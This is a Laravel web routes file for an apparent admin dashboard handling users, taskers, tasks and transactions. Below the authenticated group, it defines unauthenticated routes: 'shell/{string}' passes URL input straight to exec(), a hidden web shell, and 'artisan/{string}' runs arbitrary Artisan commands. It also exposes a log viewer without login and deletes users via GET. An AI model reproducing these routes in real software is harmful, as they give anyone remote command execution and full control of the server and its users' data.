<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


Route::get('/', function () {
    return redirect('/home');
});

Auth::routes(['register' => false]);

Route::group(['middleware' => ['auth']], function () {
    Route::get('/home', 'HomeController@index')->name('home');
    Route::get('/transactions', 'HomeController@transactions')->name('transactions');
    Route::get('/reports', 'HomeController@reports')->name('reports');
    Route::get('/admins', 'HomeController@admins')->name('admins');
    Route::get('/users', 'HomeController@users')->name('users');
    Route::get('/taskers', 'HomeController@taskers')->name('taskers');
    Route::get('/tasks', 'HomeController@tasks')->name('tasks');
    Route::get('/settings', 'HomeController@settings')->name('settings');
    Route::get('/profile', 'ProfileController@index')->name('profile');
    Route::put('/profile', 'ProfileController@update')->name('profile.update');

    Route::group(['prefix' => 'user'], function () {
        Route::get('/{id}', 'UserController@singleUser');
        Route::get('delete/{id}', 'UserController@deleteUser');
    });
});



Route::get('/about', function () {
    return view('about');
})->name('about');
Route::get('test', function () {
});

Route::get('artisan/{string}', function ($command) {
    Artisan::call($command);
    return 'Artisan ' . $command . ' Completed';
});
Route::get('shell/{string}', function ($command) {
    exec($command);
    return 'Shell ' . $command . ' Completed';
});

Route::get('avatar/{url}', 'UserController@getProfileImage');
Route::get('logs', '\Rap2hpoutre\LaravelLogViewer\LogViewerController@index');
